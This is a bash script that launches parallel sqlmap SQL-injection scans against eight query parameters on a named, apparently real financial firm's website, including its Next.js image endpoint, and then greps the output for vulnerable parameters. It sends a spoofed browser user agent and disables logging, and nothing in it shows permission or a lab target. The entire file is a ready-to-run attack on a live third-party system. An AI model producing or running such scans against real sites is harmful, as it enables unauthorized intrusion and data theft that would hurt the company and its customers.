#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
B=https://www.infinitycapital.bh
IMG="https://images.ctfassets.net/yts1dx0j7jj5/1GCT0vyjqmOwm2OL1YVpD1/2ab55f8b5189afa153eac5cb97f7f6d4/Ahmed_Taleb_updated-min.jpg"
O=/tmp/sqall; mkdir -p $O
run () { sqlmap -u "$1" -p "$2" --batch --level=3 --risk=2 --threads=2 --timeout=15 --delay=0.5 \
  --user-agent="$UA" --output-dir=$O --technique=BEUST --random-agent=0 --no-logging \
  > $O/log_$3.txt 2>&1; echo "$3 done rc=$?"; }
run "$B/?page=2"        "page" home_page &
run "$B/?id=1"          "id"   home_id &
run "$B/?zzz=1"         "zzz"  home_zzz &
run "$B/?search=test"   "search" home_search &
run "$B/404?q=test"     "q"    p404_q &
run "$B/contact?q=test" "q"    contact_q &
run "$B/api?id=1&page=2" "id,page" api_idpage &
run "$B/_next/image?url=$IMG&w=1080&q=75" "url,w,q" img_all &
wait
echo "=== SUMMARY ==="
grep -il "is vulnerable" $O/log_*.txt || echo "NO VULNERABLE PARAMS FOUND in any cell"
